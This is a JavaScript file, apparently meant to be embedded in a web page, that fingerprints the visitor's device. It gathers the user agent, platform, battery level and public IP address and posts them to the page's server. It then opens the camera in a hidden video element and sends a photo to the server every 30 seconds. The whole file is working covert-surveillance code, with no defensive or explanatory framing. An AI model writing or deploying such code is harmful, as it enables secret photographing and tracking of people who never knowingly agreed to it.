// Collect User-Agent, OS Info, and Device Name
const userAgent = navigator.userAgent;
const os = navigator.platform;
let deviceName = "Unknown Device";

// Approximate device name from User-Agent
if (/Mobile|Android|iPhone|iPad|iPod/.test(userAgent)) {
    deviceName = "Mobile Device";
} else if (/Macintosh|MacIntel/.test(userAgent)) {
    deviceName = "Mac Device";
} else if (/Win/.test(userAgent)) {
    deviceName = "Windows Device";
} else if (/Linux/.test(userAgent)) {
    deviceName = "Linux Device";
}

// Collect Battery Percentage
navigator.getBattery().then(battery => {
    const batteryPercentage = (battery.level * 100).toFixed(2) + "%";

    // Get IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // Compile all details
            const details = `User Agent: ${userAgent}\nOperating System: ${os}\nDevice Name: ${deviceName}\nBattery Percentage: ${batteryPercentage}\nIP Address: ${ipAddress}`;

            // Send details to server
            fetch('/save-details', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ details })
            }).then(response => console.log('Details saved successfully'))
              .catch(err => console.error('Error saving details:', err));
        });
});

// Access Front Camera and Take Photo every 30 seconds
const video = document.createElement('video');
video.style.display = 'none'; // Hide the video element
document.body.appendChild(video); // Append video to the DOM (so it's available for access)

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        // Wait until video metadata (e.g., dimensions) is loaded
        video.onloadedmetadata = function () {
            video.play(); // Start video playback once metadata is ready

            setInterval(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Draw the video frame on the canvas
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Capture photo as base64
                    const photo = canvas.toDataURL('image/png');

                    // Send photo to the server
                    fetch('/save-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ photo })
                    })
                        .then(response => console.log('Photo saved successfully'))
                        .catch(error => console.error('Error saving photo:', error));
                }
            }, 30000); // Capture photo every 30 seconds
        };
    })
    .catch(err => console.error("Camera Access Denied:", err));
